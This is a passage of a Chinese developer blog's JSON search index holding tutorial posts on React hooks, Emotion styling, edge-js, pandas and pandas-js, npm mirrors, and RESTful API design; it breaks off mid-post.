使用方式","date":"2019-12-09T08:13:02.000Z","updated":"2021-06-15T06:10:52.873Z","comments":true,"path":"/stories/2019/12/React/Hooks/useImperativeHandle 使用方式/","link":"","permalink":"http://me.lizhooh.com/stories/2019/12/React/Hooks/useImperativeHandle 使用方式/","excerpt":"前言useImperativeHandle 是 React hooks 最近新增加的一个函数，它可以使用对组件的 ref 绑定。下面来看看主要的用法。 类组件的示例先给出一个类组件的示例，这个组件主要是用来进行细粒度更细，其中使用了 ref 来获取组件的引用，然后调用组件的内部方法。","text":"前言useImperativeHandle 是 React hooks 最近新增加的一个函数，它可以使用对组件的 ref 绑定。下面来看看主要的用法。 类组件的示例先给出一个类组件的示例，这个组件主要是用来进行细粒度更细，其中使用了 ref 来获取组件的引用，然后调用组件的内部方法。 1234567891011121314151617181920212223242526272829303132333435363738import React, &#123; Component &#125; from 'react';class Count extends Component &#123; constructor(props) &#123; super(props); this.update.bind(this); this.state = &#123; count: 0, &#125;; &#125; update(num) &#123; this.setState(&#123; count: this.state.count + num &#125;); &#125; render() &#123; const &#123; count &#125; = this.state; return ( &lt;div&gt; &lt;h3&gt;Hello：&#123;count&#125;&lt;/h3&gt; &lt;/div&gt; ); &#125;&#125;export default class App extends Component &#123; onClick(e) &#123; if (this.countRef) &#123; this.countRef.update(1); &#125; &#125; render() &#123; return ( &lt;div&gt; &lt;Count ref=&#123;r =&gt; this.countRef = r&#125; /&gt; &lt;button onClick=&#123;this.onClick.bind(this)&#125;&gt;点我 + 1&lt;/button&gt; &lt;/div&gt; ); &#125;&#125; 具体情况是，Count 组件的状态是由自己内部控制的，提供了一个 update 方法用于更新组件的状态，在外部父级里，通过调用 update 方法来更新组件的状态。 纯函数组件示例那么如何在纯函数组件里实现同样的效果呢？我们知道在纯函数里可以使用 hooks 来提供状态，但是因为是函数组件，没有 this 的概念。 因此，React 为我们提供了 useImperativeHandle 函数来解决这个问题，具体看下面的使用。 12345678910111213141516171819202122232425262728293031323334353637import React, &#123; useState, useImperativeHandle, useRef, forwardRef,&#125; from 'react';const Count = forwardRef((props, ref) =&gt; &#123; const [count, setCount] = useState(0); // 重点 useImperativeHandle(ref, () =&gt; (&#123; update: (num) =&gt; &#123; setCount(count + num); &#125;, &#125;), [count]); return ( &lt;div&gt; &lt;h3&gt;Hello：&#123;count&#125;&lt;/h3&gt; &lt;/div&gt; );&#125;);export default () =&gt; &#123; const ref = useRef(null); const onClick = e =&gt; &#123; ref.current.update(1); &#125;; return ( &lt;div&gt; &lt;Count ref=&#123;ref&#125; /&gt; &lt;button onClick=&#123;onClick&#125;&gt;点我 + 1&lt;/button&gt; &lt;/div&gt; );&#125; 需要使用 useImperativeHandle 和 forwardRef 配合使用。 好，这篇文章完结。 参考资料 https://react.docschina.org/docs/hooks-reference.html?#useimperativehandle","categories":[{"name":"React","slug":"React","permalink":"http://me.lizhooh.com/categories/React/"}],"tags":[{"name":"Javascript","slug":"Javascript","permalink":"http://me.lizhooh.com/tags/Javascript/"},{"name":"前端","slug":"前端","permalink":"http://me.lizhooh.com/tags/前端/"},{"name":"React","slug":"React","permalink":"http://me.lizhooh.com/tags/React/"}]},{"title":"谈谈 VNode 设计之生成 JSX 代码","slug":"前端/谈谈 VNode 设计之生成 JSX 代码","date":"2019-11-18T08:36:42.000Z","updated":"2021-06-15T06:10:52.907Z","comments":true,"path":"/stories/2019/11/前端/谈谈 VNode 设计之生成 JSX 代码/","link":"","permalink":"http://me.lizhooh.com/stories/2019/11/前端/谈谈 VNode 设计之生成 JSX 代码/","excerpt":"前言接到一个很重要的任务，就是用 Javascript 对象来描述 React 组件代码，换个角度看就是给定一个 VNode 对象，编写一个函数，生产 React JSX 代码。 看起来似乎很简单，实际上做起来有点难，问题在于如何用 VNode 来描述，如何根据 VNode 生产对应的字符串代码（带格式化哦）。","text":"前言接到一个很重要的任务，就是用 Javascript 对象来描述 React 组件代码，换个角度看就是给定一个 VNode 对象，编写一个函数，生产 React JSX 代码。 看起来似乎很简单，实际上做起来有点难，问题在于如何用 VNode 来描述，如何根据 VNode 生产对应的字符串代码（带格式化哦）。 抽象 DOM 树JSX 是一种 HTML + Javascript 的描述语法，在抽象 DOM 树里，我们可以使用 Javascript 对象来描述 DOM。 例如： 1234567891011&#123; tag: 'div' className: 'test' children: [ &#123; tag: 'span', className: 'demo' text: 'hello, VNode' &#125; ]&#125; 这个对象映射出来的是： 123&lt;div className='test'&gt; &lt;span className='demo'&gt;hello, VNode&lt;/span&gt;&lt;/div&gt; VNode 设计123456789101112131415161718192021222324const vnode = &#123; id: '', // ID className: 'abc', // 类名 style: &#123;&#125;, // 样式对象 type: 'ELEMENT_NODE' tag: 'div', // 标签名 text: '', // 标签文本 props: &#123; // 属性 title: 'state.title', &#125;, children: [ // 子节点集合 &#123; type: 'TEXT_NODE' // 纯的文本节点 text: 'state.title', &#125;, &#123; type: 'ELEMENT_NODE' // 元素节点 tag: 'span', text: 'state.time' &#125; ], jsxStr: '', // 翻译的 jsx 字符串 parent: '', // 父节点的引用，空时表示是根节点&#125;; 然后生成的代码是： 1234&lt;div className='abc' title=&#123;state.title&#125;&gt; &#123;state.title&#125; &lt;span&gt;&#123;state.time&#125;&lt;/span&gt;&lt;/div&gt; 参考资料 https://zhuanlan.zhihu.com/p/30982140","categories":[{"name":"前端","slug":"前端","permalink":"http://me.lizhooh.com/categories/前端/"}],"tags":[{"name":"前端","slug":"前端","permalink":"http://me.lizhooh.com/tags/前端/"}]},{"title":"NPM 解决烦人的墙问题","slug":"Npm/NPM 解决烦人的墙问题","date":"2019-11-17T15:00:37.000Z","updated":"2021-06-15T06:10:52.847Z","comments":true,"path":"/stories/2019/11/Npm/NPM 解决烦人的墙问题/","link":"","permalink":"http://me.lizhooh.com/stories/2019/11/Npm/NPM 解决烦人的墙问题/","excerpt":"前言npm 安装有些模块有 “墙” 的问题，例如 node-sass，electron 等包，因此我们需要做一些国内的镜像。在以往的解决方式是你安装什么就设置什么镜像，而现在有人弄了一个叫 mirror-config-china 的包来专门集中式的解决这个问题。 使用123npm i -g mirror-config-china --registry=https://registry.npm.taobao.org# 检查是否安装成功npm config list","text":"前言npm 安装有些模块有 “墙” 的问题，例如 node-sass，electron 等包，因此我们需要做一些国内的镜像。在以往的解决方式是你安装什么就设置什么镜像，而现在有人弄了一个叫 mirror-config-china 的包来专门集中式的解决这个问题。 使用123npm i -g mirror-config-china --registry=https://registry.npm.taobao.org# 检查是否安装成功npm config list 参考资料 https://www.npmjs.com/package/mirror-config-china","categories":[{"name":"NPM","slug":"NPM","permalink":"http://me.lizhooh.com/categories/NPM/"}],"tags":[{"name":"前端","slug":"前端","permalink":"http://me.lizhooh.com/tags/前端/"},{"name":"NPM","slug":"NPM","permalink":"http://me.lizhooh.com/tags/NPM/"}]},{"title":"💅 React 样式库 Emotion 使用指南","slug":"React/Style/React 样式库 Emotion 使用指南","date":"2019-11-16T08:02:47.000Z","updated":"2021-06-15T06:10:52.885Z","comments":true,"path":"/stories/2019/11/React/Style/React 样式库 Emotion 使用指南/","link":"","permalink":"http://me.lizhooh.com/stories/2019/11/React/Style/React 样式库 Emotion 使用指南/","excerpt":"前言Emotion 是一个比 styled-components 更加轻量级的 CSS in JS 样式库。 除了提供出色的开发人员体验（如源映射，标签和测试实用程序）外，它还提供了强大且可预测的样式组成。字符串和对象样式均受支持。","text":"前言Emotion 是一个比 styled-components 更加轻量级的 CSS in JS 样式库。 除了提供出色的开发人员体验（如源映射，标签和测试实用程序）外，它还提供了强大且可预测的样式组成。字符串和对象样式均受支持。 与 styled-components 的区别styled-components 目前只提供 styled 的方式包裹组件，而 Emotion 能做到不包裹组件。 下面是 styled-components 的包裹组件写法。 12345import styled from 'styled-components';const Button = styled.button` font-size: 20px;`; Emotion 同样的支持这种写法，它还提供了另一种写法： 1234567891011121314151617/** @jsx jsx */import React from 'react';import &#123; css, jsx &#125; from '@emotion/core';export default () =&gt; ( &lt;div&gt; &lt;h1 css=&#123;styles.h1&#125;&gt;Hello&lt;/h1&gt; &lt;/div&gt;);const styles = &#123; h1: css` font-size: 32px; color: #39f; font-weight: normal; `,&#125;; 安装emotion 里有比较多的包： 1234567891011121314151617# 框架不确定yarn add emotion# react 专用yarn add @emotion/core# styled 方式yarn add @emotion/styled# SSRyarn add emotion-server# 主题yarn add emotion-theming# react-nativeyarn add @emotion/native 基本使用如果安装了 emotion，就这样使用： 12345678910111213141516import React from 'react';import &#123; css &#125; from 'emotion';export default () =&gt; ( &lt;div&gt; &lt;h1 className=&#123;styles.h1&#125;&gt;Hello&lt;/h1&gt; &lt;/div&gt;);const styles = &#123; h1: css` font-size: 32px; color: #39f; font-weight: normal; `,&#125;; 如果安装了 @emotion/core，就这样使用： 1234567891011121314151617/** @jsx jsx */import React from 'react';import &#123; css, jsx &#125; from '@emotion/core';export default () =&gt; ( &lt;div&gt; &lt;h1 css=&#123;styles.h1&#125;&gt;Hello&lt;/h1&gt; &lt;/div&gt;);const styles = &#123; h1: css` font-size: 32px; color: #39f; font-weight: normal; `,&#125;; 注意：/** @jsx jsx */ 这个注释必须写上，不然会没效果。也可以使用 babel 的插件。 Babel 插件123yarn add --dev babel-plugin-emotion# 自动添加 /** @jsx jsx */yarn add --dev @emotion/babel-preset-css-prop 在 .babelrc 里添加： 1234&#123; \"presets\": [\"@emotion/babel-preset-css-prop\"], \"plugins\": [\"emotion\"]&#125; 组成（Composition）Emotion 支持样式组成的方式： 1234567891011121314151617/** @jsx jsx */import &#123; jsx, css &#125; from '@emotion/core'export default () =&gt; ( &lt;div css=&#123;h1&#125;&gt; This is hotpink. &lt;/div&gt;);const base = css` color: hotpink;`,const h1 = css` $&#123;base&#125;; background-color: #eee;`, 也可以这样写： 123456789101112131415161718/** @jsx jsx */import React from 'react';import &#123; jsx, css &#125; from '@emotion/core';export default () =&gt; ( &lt;div css=&#123;[styles.base, styles.h1]&#125;&gt; This is hotpink. &lt;/div&gt;);const styles = &#123; base: css` color: hotpink; `, h1: css` background-color: #eee; `,&#125;; 支持 Sass 部分语法跟 styled-components 一样，支持 sass 的内嵌语法。 123456789const h1 = css` font-size: 30px; @media (min-width: 420px) &#123; font-size: 50px; &#125; &amp;:hover &#123; color: #39f; &#125;`; 全局样式（Global）全局样式需要使用 Global 组件，在 styles 里添加 css。 123456789import &#123; Global, css &#125; from '@emotion/core';&lt;Global styles=&#123;css` .some-class &#123; color: hotpink !important; &#125; `&#125;/&gt; 主题（Theme）类似 styled-components 的主题功能。 1yarn add emotion-theming 示例： 123456789101112131415161718192021222324import React from 'react';import ReactDOM from 'react-dom';import &#123; ThemeProvider &#125; from 'emotion-theming';/** @jsx jsx */import &#123; jsx &#125; from '@emotion/core';import styled from '@emotion/styled';const theme = &#123; color: 'red'&#125;;const Box = styled.div` color: $&#123;p =&gt; p.theme.color&#125;;`;const Page = () =&gt; ( &lt;Box /&gt;);const App = () =&gt; ( &lt;ThemeProvider theme=&#123;theme&#125;&gt; &lt;Page /&gt; &lt;/ThemeProvider&gt;); 在 React-Native 上使用在 React-Native 上使用 Emotion，需要安装： 1yarn add @emotion/core @emotion/native 示例： 12345678910111213141516171819202122import React from 'react';import styled, &#123; css &#125; from '@emotion/native';import &#123; Text &#125; from 'react-native';const Container = styled.View` display: flex; justify-content: center; align-items: center; margin: 50px;`;const App = () =&gt; ( &lt;Container&gt; &lt;Text&gt;Hello&lt;/Text&gt; &lt;/Container&gt;);const styles = &#123; h1: css` font-size: 20px; `;&#125; 参考资料 https://emotion.sh/docs/introduction","categories":[{"name":"React","slug":"React","permalink":"http://me.lizhooh.com/categories/React/"}],"tags":[{"name":"Javascript","slug":"Javascript","permalink":"http://me.lizhooh.com/tags/Javascript/"},{"name":"前端","slug":"前端","permalink":"http://me.lizhooh.com/tags/前端/"},{"name":"React","slug":"React","permalink":"http://me.lizhooh.com/tags/React/"}]},{"title":"Nodejs 完美调用 C# 的代码","slug":"Nodejs/Nodejs 完美调用 C井 的代码","date":"2019-11-08T09:16:46.000Z","updated":"2021-06-15T06:10:52.839Z","comments":true,"path":"/stories/2019/11/Nodejs/Nodejs 完美调用 C井 的代码/","link":"","permalink":"http://me.lizhooh.com/stories/2019/11/Nodejs/Nodejs 完美调用 C井 的代码/","excerpt":"前言在 Nodejs 里有许多的与原生调用的模块，例如：node-ffi，edge-atom-shell 等。它们提供的是在 Nodejs 里与 C、C++、C# 等语言的通讯。 本文以 edge-atom-shell，介绍如何在 Nodejs 里调用 C# 的代码，C# 生成的 DLL 库。","text":"前言在 Nodejs 里有许多的与原生调用的模块，例如：node-ffi，edge-atom-shell 等。它们提供的是在 Nodejs 里与 C、C++、C# 等语言的通讯。 本文以 edge-atom-shell，介绍如何在 Nodejs 里调用 C# 的代码，C# 生成的 DLL 库。 调用 C# 代码首先，这里的 edge.func 内的注释就是 C# 的代码。 123456789101112const edge = require('edge-js');const helloWorld = edge.func(function () &#123;/* async (input) =&gt; &#123; return \".NET Welcomes \" + input.ToString(); &#125;*/&#125;);helloWorld('JavaScript', function (error, result) &#123; if (error) throw error; console.log(result);&#125;); 运行之后，可以看到输出 .NET Welcomes JavaScript。 这样在注释里写 C# 的代码比较挫，不过可以直接导入 C# 的文件。 下面是一个 text.cs 文件。 123456789101112131415161718using System.Threading.Tasks;public class Person &#123; public int anInteger = 1; public double aNumber = 3.1415; public string aString = \"foo\"; public bool aBoolean = true; public byte[] aBuffer = new byte[10]; public object[] anArray = new object[] &#123; 1, \"foo\" &#125;; public object anObject = new &#123; a = \"foo\", b = 12 &#125;;&#125;public class Startup &#123; public async Task&lt;object&gt; Invoke(dynamic input) &#123; Person person = new Person(); return person; &#125;&#125; 接着在 Nodejs 里自己调用。 12345678const edge = require('edge-js');const getPerson = edge.func('./test.cs');getPerson(null, function (error, result) &#123; if (error) throw error; console.log(result);&#125;); 输出内容： 123456789&#123; anInteger: 1, aNumber: 3.1415, aString: 'foo', aBoolean: true, aBuffer: &lt;Buffer 00 00 00 00 00 00 00 00 00 00&gt;, anArray: [ 1, 'foo' ], anObject: &#123; a: 'foo', b: 12 &#125;&#125; 这样使用文件的话，必须实现 Startup 类和 Invoke 方法。 123456public class Startup &#123; public async Task&lt;object&gt; Invoke(dynamic input) &#123; // 这里相当于入口函数 return \"Hello\"; &#125;&#125; 参考资料 https://www.npmjs.com/package/edge-atom-shell https://www.npmjs.com/package/edge-js https://www.npmjs.com/package/electron-edge-js https://github.com/node-ffi/node-ffi","categories":[{"name":"Nodejs","slug":"Nodejs","permalink":"http://me.lizhooh.com/categories/Nodejs/"}],"tags":[{"name":"后端","slug":"后端","permalink":"http://me.lizhooh.com/tags/后端/"},{"name":"Nodejs","slug":"Nodejs","permalink":"http://me.lizhooh.com/tags/Nodejs/"},{"name":"Javascript","slug":"Javascript","permalink":"http://me.lizhooh.com/tags/Javascript/"}]},{"title":"Nodejs 数据分析：Pandasjs","slug":"Nodejs/Nodejs 数据分析：Pandasjs","date":"2019-10-28T03:04:36.000Z","updated":"2021-06-15T06:10:52.840Z","comments":true,"path":"/stories/2019/10/Nodejs/Nodejs 数据分析：Pandasjs/","link":"","permalink":"http://me.lizhooh.com/stories/2019/10/Nodejs/Nodejs 数据分析：Pandasjs/","excerpt":"前言Pandasjs 是一个 Nodejs 是模仿 Python pandas 库的开源（实验）库。它依赖于 Immutable.js 作为 NumPy 逻辑等效项。像 Python pandas 一样，Pandasjs 中的主要数据对象是 Series 和 DataFrame。","text":"前言Pandasjs 是一个 Nodejs 是模仿 Python pandas 库的开源（实验）库。它依赖于 Immutable.js 作为 NumPy 逻辑等效项。像 Python pandas 一样，Pandasjs 中的主要数据对象是 Series 和 DataFrame。 此文章是与：Python Pandas 数据统计，相呼应的。 Pandas1yarn add pandas-js 创建数据有两种类型可以创建的，一种是 Series（表示一行，一维数据），DataFrame（表示二维数据）。 DataFrame 里有很多个 Series 组成。 123import &#123; Series, DataFrame &#125; from 'pandas-js';const s = new Series([1, 2, 3, 4], &#123; index: [2, 3, 4, 5] &#125;); 在默认情况下，Series 会自动建立索引，DataFrame 同样也是。 123456const d = new DataFrame([ &#123; '姓名': '老王', '评分': '不及格', '工资': 5000, '绩效': 60 &#125;, &#123; '姓名': '小明', '评分': '良好', '工资': 9000, '绩效': 84 &#125;, &#123; '姓名': '小林', '评分': '优秀', '工资': 7000, '绩效': 98 &#125;, &#123; '姓名': '老徐', '评分': '优秀', '工资': 8500, '绩效': 91 &#125;,]); 输出结构在 Python 里可以直接 print(d) 在控制台里输出结构，在 Nodejs 里需要调用 toString 方法来输出结构。 1console.log(d.toString()); 为了方便使用，我们在原型链上添加一个 show 方法： 1234567DataFrame.prototype.show = function () &#123; console.log(this.toString());&#125;;Series.prototype.show = function () &#123; console.log(this.toString());&#125;; 这样就可以很方便的输出结构了： 1d.show(); 查看数据在 Python 里可以直接通过索引进行查看数据，在 Nodejs 里需要使用 get/set 函数。 官方说到 Series 返回的是 Immutable.List，因此获取 Series 的值比较特殊。 对于 DataFrame 来说，有 get/set 函数可以使用，返回的是一个 Series 对象。 12345d.get('姓名').show();const series = d.get('姓名');console.log(series.values.get(0)); // 老王 列的操作 新增加列： 12// 不会对原来的进行操作，返回一个新 DataFrame 对象const d2 = d.set('备注', new Series(['傻x', '刷单', null, null])); 删除某列： 1文档好像没有这个 api 查看某列数据： 1d.get('姓名'); 查看多列数据： 1d.get(['姓名', '工资']); 更新某列： 1d.set('备注', new Series(['傻x', '刷单', null, null])); 对某列进行排序： 1d.get('工资').sort_values(true); // 升序 行的操作 查看数据，掐头看尾，或者是某行数据： 12345d.head(2);d.tail(2);// 查看第 0 行d.values.get(0).toString() 查看指定位置的数据，例如 （1，3），注意是从 0 开始算起： 12// 某个定点d.iloc(1, 3).show() 查看指定范围的行列： 1d.iloc([0, 2], [0, 3]).show() 查看某几行范围： 1d.iloc([0, 2]).show() 新增一行： 123const d2 = d.append(new DataFrame([&#123; '姓名': '老信息', '评分': '优秀', '工资': 8500, '绩效': 91&#125;])); 加减乘除在 Python 里可以直接用操作符，在 Nodejs 需要使用 add/sub/mul/div。 加： 12345678910d.get('工资').add(5);d.get('工资').add([1000, 2000, 100, 500]).show();d.get('工资').add(new Series([1000, 2000, 100, 500])).show();&gt;0 60001 110002 71003 9000Name: 工资, dtype: dtype(int) 减： 1d.get('工资').sub(5); 乘： 1d.get('工资').mul(5); 除： 1d.get('工资').div(5); 筛选 等值判断： 12345678910111213141516d.get('工资').eq(5000).show();&gt;0 true1 false2 false3 falseName: 工资, dtype: dtype(bool)d.eq(5000).show(); | 姓名 | 评分 | 工资 | 绩效 |------------------------------0 | false | false | true | false |1 | false | false | false | false |2 | false | false | false | false |3 | false | false | false | false | 大于/小于某个值： 1234d.get('工资').lt(5000);d.get('工资').lte(5000);d.get('工资').gt(5000);d.get('工资').gte(5000); 过滤，筛选： 1d.get('工资').filter(d.get('工资').gte(1)).show(); 遍历迭代使用 for … of 进行迭代 DataFrame。 1234// Logs 2 4 6for(const [row, idx] of d) &#123; console.log(row.get('x') * 2);&#125; 使用 map 迭代 Series。 123const ds = new Series([1, 2, 3, 4]);ds.map((val, idx) =&gt; val ** 2; 统计函数 cumsum()：累加和，如果是字符串则按照字符串的累加。 1d.get('工资').cumsum(); mean()，std()，max()，min()，median()，diff()，kurt()，mad()，skew()，var()，pct_change()，quantile()：平局数，标准差，最小值，最大值，中位数，差分，无偏峰度，无偏偏度，无偏方差，平均绝对偏差，百分比变化率，分位数。 123456d.get('工资').mean()d.get('工资').sid()d.get('工资').max()d.get('工资').min()d.get('工资').diff()d.get('工资').quantile(0.1, 0.5) # 10% ~ 50% 参考资料 https://stratodem.github.io/pandas.js-docs/#introduction","categories":[{"name":"Nodejs","slug":"Nodejs","permalink":"http://me.lizhooh.com/categories/Nodejs/"}],"tags":[{"name":"后端","slug":"后端","permalink":"http://me.lizhooh.com/tags/后端/"},{"name":"Nodejs","slug":"Nodejs","permalink":"http://me.lizhooh.com/tags/Nodejs/"},{"name":"Javascript","slug":"Javascript","permalink":"http://me.lizhooh.com/tags/Javascript/"}]},{"title":"Python Pandas 数据统计","slug":"Python/Python Pandas 数据统计","date":"2019-10-27T10:14:06.000Z","updated":"2021-06-15T06:10:52.850Z","comments":true,"path":"/stories/2019/10/Python/Python Pandas 数据统计/","link":"","permalink":"http://me.lizhooh.com/stories/2019/10/Python/Python Pandas 数据统计/","excerpt":"前言Pandas 是基于 Numpy 的专业数据分析工具，可以灵活高效的处理各种数据集，也是我们后期分析案例的神器。它提供了两种类型的数据结构，分别是 DataFrame 和 Series，我们可以简单粗暴的把DataFrame 理解为 Excel 里面的一张表，而 Series 就是表中的某一列。","text":"前言Pandas 是基于 Numpy 的专业数据分析工具，可以灵活高效的处理各种数据集，也是我们后期分析案例的神器。它提供了两种类型的数据结构，分别是 DataFrame 和 Series，我们可以简单粗暴的把DataFrame 理解为 Excel 里面的一张表，而 Series 就是表中的某一列。 Pandas创建数据Pandas 有两种数据结构，一维与二维，创建数据使用 Series 或 DataFrame。 下面，创建一个比较常见的员工工资信息数据。 12345678import pandas as pdd = pd.DataFrame(&#123; '姓名': ['老王', '小明', '小林', '老徐'], '评分': ['不及格', '良好', '优秀', '优秀'], '工资': [5000, 9000, 7000, 8500], '绩效': [60, 84, 98, 91],&#125;) 查看数据 查看数据信息： 1234567891011d.info()&gt;RangeIndex: 4 entries, 0 to 3Data columns (total 4 columns):姓名 4 non-null object评分 4 non-null object工资 4 non-null int64绩效 4 non-null int64dtypes: int64(2), object(2)memory usage: 208.0+ bytes 快速查看统计信息概览： 1d.describe() 列的操作 新增加列： 1d['奖金'] = [0, 0, 0, 0] 删除某列： 12# axis=1 是针对列操作， inplace=True 是覆盖源数据，而不是产生副本d.drop('奖金', axis=1, inplace=True) 查看某列数据： 1234567d['姓名']&gt;0 老王1 小明2 小林3 老徐 查看多列数据： 1234567d[['姓名', '工资']]&gt; 姓名 工资0 老王 50001 小明 90002 小林 70003 老徐 8500 对某列进行排序： 12345678# ascending 默认是 True（升序）d.sort_values('工资', ascending=False)&gt; 姓名 评分 工资 绩效1 小明 良好 9000 843 老徐 优秀 8500 912 小林 优秀 7000 980 老王 不及格 5000 60 行的操作 查看数据，掐头看尾，或者是某行数据： 1234567891011d.head(2)&gt; 姓名 评分 工资 绩效0 老王 不及格 5000 601 小明 良好 9000 84d.tail(2)&gt; 姓名 评分 工资 绩效2 小林 优秀 7000 983 老徐 优秀 8500 91 查看指定位置的数据，例如 （1，3），注意是从 0 开始算起： 123d.iloc[1, 3]&gt; 84 查看指定范围的行列： 12345d.iloc[0:2, 0:3]&gt; 姓名 评分 工资0 老王 不及格 50001 小明 良好 9000 查看某几行范围： 12345d[0:2]&gt; 姓名 评分 工资 绩效0 老王 不及格 5000 601 小明 良好 9000 84 加减乘除Python 比较好的是支持重写操作符（+-*/）等。 例如上面，计算出奖金： 1234567d['奖金'] = d['工资'] * d['绩效'] / 100&gt; 姓名 评分 工资 绩效 奖金0 老王 不及格 5000 60 3000.01 小明 良好 9000 84 7560.02 小林 优秀 7000 98 6860.03 老徐 优秀 8500 91 7735.0 但只能对数字类型的行列进行操作。 有时候想要加上单位，那么这样这样做，使用 astype 转换类型。 1234567d['奖金'] = (d['工资'] * d['绩效'] / 100).astype('int').astype('str')+ 'k'&gt; 姓名 评分 工资 绩效 奖金0 老王 不及格 5000 60 3000k1 小明 良好 9000 84 7560k2 小林 优秀 7000 98 6860k3 老徐 优秀 8500 91 7735k astype 是强行转换，支持 bool，int，str，object，float 等，可以用 type(xxx) 来输出类型 如果工资原来就带有 k，那么怎么办呢？ 1d['工资'] = d['工资'].replace('k$', '', regex=True).astype('int') 时间类型操作如果导入的数据是时间类型，默认 Pandas 会只识别为字符串类型，需要自己手动的转换一下。 123d['时间'] = ['2019-01-01']d['时间'] = pd.to_datetime(d['时间']) 使用 pd.to_datetime 就可以转换成时间类型了。 具有时间类型的数据，可以进行一些操作符运算，例如： 123&gt; pd.to_datetime('2019-05-01') - pd.to_datetime('2019-01-01')&gt; 120 days 00:00:00 遍历迭代12for i, row in dataFrame.iterrows(): print(row['姓名']) 统计函数 apply()：一般与 np 的函数或 lambda 进行使用。 123456789101112# 工资 - 100d['工资'].apply(lambda v: v - 100)# 统计工资总和，axis=0 是按照列来计算d.apply(np.sum, axis=0)['工资']# 在工资里的最大，最小值d.apply(np.max, axis=0)['工资']d.apply(np.min, axis=0)['工资']# 工资最大和最小差了多少？d[['工资']].apply(lambda x: x.max() - x.min()) count()：统计非 None 的数量。 1d['姓名'].count() cumsum()：累加和，如果是字符串则按照字符串的累加。 1234567d[['姓名', '工资']].cumsum() 姓名 工资0 老王 50001 老王小明 140002 老王小明小林 210003 老王小明小林老徐 29500 mean()，std()，max()，min()，median()，diff()，kurt()，mad()，skew()，var()，pct_change()，quantile()：平局数，标准差，最小值，最大值，中位数，差分，无偏峰度，无偏偏度，无偏方差，平均绝对偏差，百分比变化率，分位数。 123456d['工资'].mean()d['工资'].sid()d['工资'].max()d['工资'].min()d['工资'].diff()d['工资'].quantile(0.1, 0.5) # 10% ~ 50% rand()：给出排名。 1234567d['工资排名'] = d['工资'].rank(ascending=False).astype('int')&gt; 姓名 评分 工资 绩效 工资排名0 老王 不及格 5000 60 41 小明 良好 9000 84 12 小林 优秀 7000 98 33 老徐 优秀 8500 91 2 groupby()：用于分组，对分组进行统计，可以应用在多个场景。 1234567891011121314151617181920212223242526# 统计评分个数d.groupby('性别').size()&gt;评分不及格 1优秀 2良好 1# 多个维度分组d['性别'] = ['男', '女', '男', '男']d.groupby(['评分', '性别']).size()&gt;评分 性别不及格 男 1优秀 女 1 男 1良好 男 1# 获取某个数d.groupby(['评分', '性别']).size()['优秀', '男']&gt; 1d.groupby(['性别']).size()['男']&gt; 3 join()：类似 SQL 风格的合并。 1234left = pd.DataFrame(&#123; 'key': ['foo', 'foo'], 'lval': [1, 2]&#125;)right = pd.DataFrame(&#123; 'key': ['foo', 'foo'], 'rval': [4, 5]&#125;)pd.merge(left, right, on='key') find()：这不是一个内置函数，而是一个自己实现的函数。 12345678910111213141516171819202122232425d = pd.DataFrame(&#123; '姓名': ['老王', '小明', '小林', '老徐', '老王'], '评分': ['不及格', '良好', '优秀', '优秀', '优秀'], '性别': ['男', '男', '女', '男', '男'], '工资': [5000, 9000, 7000, 8500, 5500], '绩效': [60, 84, 98, 91, 90], '月份': ['一月', '一月', '一月', '一月', '二月']&#125;)# 查找某人的信息def find(dataFrame: pd.DataFrame, name: str) -&gt; pd.DataFrame: list = [] index = [] for i, row in dataFrame.iterrows(): if (row['姓名'] == name): index.append(row['月份']) list.append(row[['姓名', '评分', '性别', '工资', '绩效']]) return pd.DataFrame(list, index)find(d, '老王')&gt; 姓名 评分 性别 工资 绩效一月 老王 不及格 男 5000 60二月 老王 优秀 男 5500 90 补充：Python 类型在 Python 3.5+ 可以编写一个类型提示： 12345678def func(param: type) -&gt; type: return ...def add(x: int, y: int) -&gt; int: return x + yuserName: str = '小明' 写法类似 typescript，类型在变量后面。","categories":[{"name":"Python","slug":"Python","permalink":"http://me.lizhooh.com/categories/Python/"}],"tags":[{"name":"学习笔记","slug":"学习笔记","permalink":"http://me.lizhooh.com/tags/学习笔记/"},{"name":"Python","slug":"Python","permalink":"http://me.lizhooh.com/tags/Python/"},{"name":"大数据","slug":"大数据","permalink":"http://me.lizhooh.com/tags/大数据/"}]},{"title":"小谈 RESTFUL API 设计","slug":"后端/小谈 RESTFUL API 设计","date":"2019-10-26T03:55:53.000Z","updated":"2021-06-15T06:10:52.911Z","comments":true,"path":"/stories/2019/10/后端/小谈 RESTFUL API 设计/","link":"","permalink":"http://me.lizhooh.com/stories/2019/10/后端/小谈 RESTFUL API 设计/","excerpt":"前言RESTful本身是一种风格而不是规范，本文为该风格的规范实现的最佳实践，本文档详细说明了HTTP RESTful API的定义和使用规范，作为接口调用者和实现者的重要参考。 RESTFUL API 设计RESTFUL API 设计应该遵循使用 http method 来描述动作，在 url 里用资源的名称来表示，一般使用资源的复数形式来表示集合（列表）。 使用 http method 表示动作：GET（获取），POST（创建），PUT（更新），PATCH（部分更新），DELETE（删除）。","text":"前言RESTful本身是一种风格而不是规范，本文为该风格的规范实现的最佳实践，本文档详细说明了HTTP RESTful API的定义和使用规范，作为接口调用者和实现者的重要参考。 RESTFUL API 设计RESTFUL API 设计应该遵循使用 http method 来描述动作，在 url 里用资源的名称来表示，一般使用资源的复数形式来表示集合（列表）。 使用 http method 表示动作：GET（获取），POST（创建），PUT（更新），PATCH（部分更新），DELETE（删除）。 例如： 1234567891011121314// 获取用户集合（列表）- GET /users// 在用户集合（列表）里新添加一个用户- POST /users// 获取用户集合（列表）里的某（id）用户- GET /users/:id// 更新用户集合（列表）里的某（id）用户- PUT /users/:id// 删除用户集合（列表）里的某（id）用户- DELETE /users/:id 如果有多个资源，应该遵循层级的设计： 1234567891011121314// 获取用户集合（列表）里的某（id）用户的动态集合（列表）- GET /users/:id/activities// 在用户集合（列表）里的某（id）用户的动态集合（列表）里新增一个动态- POST /users/:id/activities// 获取用户集合（列表）里的某（id）用户的动态集合（列表）里的某（id）动态- GET /users/:id/activities/:id// 更新用户集合（列表）里的某（id）用户的动态集合（列表）里的某（id）动态- PUT /users/:id/activities/:id// 删除用户集合（列表）里的某（id）用户的动态集合（列表）里的某（id）动态- DELETE /users/:id/activities/:id 某些特殊的无法用（CURD 来表达的），例如登录注册，使用动名词组合方式： 12345678// 账号登录- POST /account/login// 获取账号登录状态- GET /account/status// 退出登录- DELETE /account/logout 搜索是个怪胎，对于搜索来说会有很多不同资源的搜索，这时是把搜索放在前面还是后面呢？ 12345// 在用户集合里搜索关键字- GET /users/serach/:keyword// 搜索用户- GET 